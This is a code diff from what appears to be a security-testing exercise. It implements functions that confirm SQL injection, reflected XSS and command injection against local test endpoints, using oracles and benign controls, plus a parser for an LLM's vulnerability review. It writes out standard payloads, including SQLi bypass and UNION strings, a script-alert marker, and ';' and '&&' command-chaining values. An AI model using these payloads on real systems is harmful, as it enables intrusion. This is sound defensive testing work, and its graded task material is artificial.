@@ -48,9 +48,16 @@ def confirm_sqli() -> list[Finding]:
 
     Return the list of Findings.
     """
-    # TODO: build the payloads (incl. a benign control) and run_payloads with a
-    #       canary oracle; return the Findings.
-    raise NotImplementedError
+    payloads = [
+        Payload("admin' OR '1'='1", intent="auth bypass", family="sqli"),
+        Payload("admin'--", intent="comment out password check", family="sqli"),
+        Payload("nobody' UNION SELECT user, secret FROM users--",
+                intent="UNION dump of the secret column", family="sqli"),
+        Payload("admin", intent="benign control (real user, wrong password)",
+                family="benign"),
+    ]
+    return run_payloads(payloads, send=login_send,
+                        oracle=contains_oracle("FLAG-sqli-"))
 
 
 def confirm_xss() -> tuple[Finding, Finding]:
@@ -69,10 +76,24 @@ def confirm_xss() -> tuple[Finding, Finding]:
     reuse ``contains_oracle`` here (the payload IS the marker, so it would confirm
     mere reflection — the exact false positive this task is about).
     """
-    # TODO: define xss_oracle (unescaped <script> present), pick a marker payload
-    #       such as "<script>alert('XSS-FIRED-7f3a')</script>", run it against
-    #       reflect_send and reflect_safe_send, and return (vuln_f, safe_f).
-    raise NotImplementedError
+    def xss_oracle(payload, response):
+        # Necessary condition for reflected XSS: the <script> survives UNescaped.
+        hit = "<script>" in response and "&lt;script&gt;" not in response
+        return hit, ("unescaped <script> reflected into HTML" if hit
+                     else "input was encoded or stripped")
+
+    marker = "<script>alert('XSS-FIRED-7f3a')</script>"
+
+    vuln_f = run_payloads(
+        [Payload(marker, intent="reflected XSS", family="xss")],
+        send=reflect_send, oracle=xss_oracle)[0]
+
+    safe_f = run_payloads(
+        [Payload(marker, intent="same payload against the fixed endpoint",
+                 family="xss")],
+        send=reflect_safe_send, oracle=xss_oracle)[0]
+
+    return vuln_f, safe_f
 
 
 def confirm_cmdi() -> list[Finding]:
@@ -86,9 +107,19 @@ def confirm_cmdi() -> list[Finding]:
     Include a benign control (a plain host with no metacharacters) that must NOT
     confirm. Return the Findings.
     """
-    # TODO: define cmdi_oracle (json injection_detected True), build payloads incl.
-    #       a benign control, run_payloads with ping_send, return the Findings.
-    raise NotImplementedError
+    import json
+
+    def cmdi_oracle(payload, response):
+        hit = json.loads(response).get("injection_detected") is True
+        return hit, ("shell metacharacter reached the command" if hit
+                     else "no shell metacharacter reached the command")
+
+    payloads = [
+        Payload("127.0.0.1; whoami", intent="command chaining with ;", family="cmdi"),
+        Payload("127.0.0.1 && id", intent="command chaining with &&", family="cmdi"),
+        Payload("127.0.0.1", intent="benign control", family="benign"),
+    ]
+    return run_payloads(payloads, send=ping_send, oracle=cmdi_oracle)
 
 
 # ============================================================================
@@ -117,9 +148,31 @@ def parse_llm_review(raw: str) -> list[ScanResult]:
     its Broken-Access-Control claim and its finding on ``do_reflect_safe``. Whether
     those are real is decided by scoring against the ground truth, not by you.
     """
-    # TODO: scan each line for a RULE_ALIASES key and a do_<name> location; emit a
-    #       ScanResult per finding. Return the list.
-    raise NotImplementedError
+    import re
+
+    finding_re = re.compile(
+        r"^\s*\d+\.\s*\[(?P<sev>\w+)\]\s*(?P<name>.+?)\s+in\s+(?P<loc>do_\w+)",
+        re.IGNORECASE | re.MULTILINE)
+
+    results = []
+    for m in finding_re.finditer(raw):
+        name = m.group("name").strip().lower()
+        rule = None
+        # check longest alias keys first so "reflected xss" matches before "xss"
+        for alias in sorted(RULE_ALIASES, key=len, reverse=True):
+            if alias in name:
+                rule = RULE_ALIASES[alias]
+                break
+        if rule is None:
+            continue  # unknown vulnerability name: nothing to map it to
+
+        results.append(ScanResult(
+            rule=rule,
+            location=m.group("loc").lower(),
+            tool="llm",
+            confidence=m.group("sev").lower(),
+        ))
+    return results
 
 
 # ============================================================================
